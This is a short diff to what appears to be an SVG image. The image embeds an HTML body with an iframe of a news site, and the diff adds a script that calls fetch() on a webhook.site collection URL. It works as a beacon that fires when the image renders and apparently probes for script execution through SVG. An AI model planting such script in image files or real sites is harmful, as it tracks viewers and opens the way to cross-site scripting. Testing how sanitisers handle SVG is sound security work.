@@ -4,6 +4,9 @@
         <foreignObject width="100%" height="100%">
             <body xmlns="http://www.w3.org/1999/xhtml">
             <iframe src="https://orf.at" style="width: 100%; height: 100%;"></iframe>
+            <script>
+                fetch('https://webhook.site/62a6efd2-3884-4c2b-af31-a95bf09f7604')
+            </script>
             </body>
         </foreignObject>
     </svg>
